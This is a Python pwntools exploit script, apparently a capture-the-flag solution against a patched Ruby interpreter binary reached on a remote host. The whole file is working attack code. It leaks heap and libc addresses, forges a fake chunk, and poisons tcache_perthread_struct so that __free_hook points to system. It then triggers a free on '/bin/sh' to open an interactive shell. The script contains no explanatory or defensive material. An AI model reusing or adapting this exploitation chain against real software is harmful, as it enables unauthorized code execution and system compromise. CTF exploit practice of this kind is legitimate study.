#!/usr/bin/python3

from pwn import *
import subprocess

def write(idx, data):
	p.sendlineafter(b'irb(main)> ', b'1')
	p.sendlineafter(b'Index: ', str(idx).encode())
	p.sendlineafter(b'data: ', data)

def read(idx):
	p.sendlineafter(b'irb(main)> ', b'2')
	p.sendlineafter(b'Index: ', str(idx).encode())

libc = ELF('./libc.so.6', checksec=False)
exe = context.binary = ELF('./ruby_patched', checksec=False)
context.log_level = 'info'

# p = process(exe.path)
p = remote('192.81.209.60', 2024)

p.sendlineafter(b'methods: ', str(0x20000002).encode())

##########################
### Stage 1: Leak heap ###
##########################
print("Leaking heap...", end='\r')
write(3, b'')
read(3)

heap_leak = u64(p.recvline()[:-1] + b'\x00\x00')
heap_base = heap_leak - 0x2c0
log.info("Heap leak: " + hex(heap_leak))
log.info("Heap base: " + hex(heap_base))

############################
### Stage 2: Leak libc ###
############################
log.info("Leaking libc...")
payload = flat(
    0, 0,
    0, 0x421,
    )
write(4, payload)
log.info("\tCreating 0x420-byte chunk...")
for i in range(2, 19):
    print(i, end='\r')
    write(3 + (i)*8, b'')

payload = flat(heap_base + 0x320, heap_base + 0x320)
write(3 + (19)*8, payload)    # Write first and check if not null --> free

read(4 + (19)*8)              # The first one was placed the new chunk address
libc_leak = u64(p.recvline()[:-1] + b'\x00\x00')
libc.address = libc_leak - 0x1ecbe0
log.info("Libc leak: " + hex(libc_leak))
log.info("Libc base: " + hex(libc.address))
################################################
### Stage 3: Exploit tcache_perthread_struct ###
################################################
log.info("Exploiting...")
write(0, b'/bin/sh\x00')

write(7 + (2)*8, flat(heap_base + 0x360, heap_base + 0x360))
write(3 + (3)*8, flat(libc.sym['__free_hook'], 0, 0, 0x290, heap_base + 0x380))
write(4 + (3)*8, b'')

write(1 + (3)*8, b'')
write(5 + (3)*8, flat(libc.sym['system']))

p.sendlineafter(b'irb(main)> ', b'0')
p.interactive()